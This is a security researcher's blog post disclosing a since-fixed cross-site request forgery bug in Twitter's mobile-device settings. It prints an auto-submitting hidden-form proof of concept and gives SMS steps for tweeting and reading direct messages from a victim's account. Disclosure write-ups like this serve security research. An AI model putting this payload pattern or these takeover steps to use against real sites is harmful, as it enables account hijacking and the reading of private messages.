---
layout: post
title: The bug that let me Tweet from Any Twitter Account
tag: 
---


In this post I will explain how I could read direct messages and Tweet from anyones Twitter account using a Cross Site Request Forgery vulnerability.

# Timeline
* Discovered: Sunday 3rd November
* Reported: Sunday 3rd November
* Fixed: Sunday 3rd November

# What is Cross Site Request Forgery?
"CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated. With a little help of social engineering (like sending a link via email/chat), an attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application." Source: <https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29>

# The Exploit
The vulnerability allows me to Tweet from anyone's Twitter account and read their direct messages. It exists in the add a mobile device feature of Twitter, where you can add a mobile device to control your account via SMS. (<https://twitter.com/settings/devices>) To exploit this we create a CSRF page that will add the attackers mobile number and network to the victims account. Although the page does provide an authenticity token aimed at preventing CSRF, it does not seem to validate that the token is correct, and therefore, we can enter any value.

The exploit code below shows the PoC that I used to send the request, of course attackers could disguise this as a real webpage and send the request in the background.

```html
<form action="https://twitter.com/settings/devices/create" method="POST"><input type="hidden" name="device_type" value="phone" />
<input type="hidden" name="authenticity_token" value="randomthinghere" />
<input type="hidden" name="device[country_code]" value="+44" />
<input type="hidden" name="device_country_intl_prefix" value="+44" />
<input type="hidden" name="device[region_country_code]" value="" />
<input type="hidden" name="device[address]" value="7123456789" />
<input type="hidden" name="carrier_name" value="Vodafone" />
<input type="hidden" name="device[carrier]" value="vodafone_uk" />
<input type="submit" value="Submit request" /></form><script type="text/javascript">
document.forms[0].submit();></script>
```

I will demo this vulnerability on my device on the Vodafone network, the network and country are important, as the mobile sms code changes for each network. Using some social engineering the attacker can force the target to visit the webpage with the exploit code on it, once we are sure the target has visited the page, Twitter will be waiting for the device to be activiated: Text "GO" to the mobile short code, in my case it was 86444. Then you will receive a confirmation SMS saying you have activated the device with the account. From here you can simply text the number to send a Tweet on the users account.

`"GO"` -> 86444

`"Your phone is activated! Reply w/ help to checkout all the things you can do with Twitter Text messaging..."`

This now indicates we have successfully compromised the account, we can now send Tweets from the targets account.

Next I can send any message to 86444:
`"Here is my PoC message"`


# Severity
Using this I could use all of the Twitter SMS features, including sending Tweets, sending messages and reading direct messages

# Protect Yourself
To protect yourself against these types of attacks in the future, I recommend Noscript.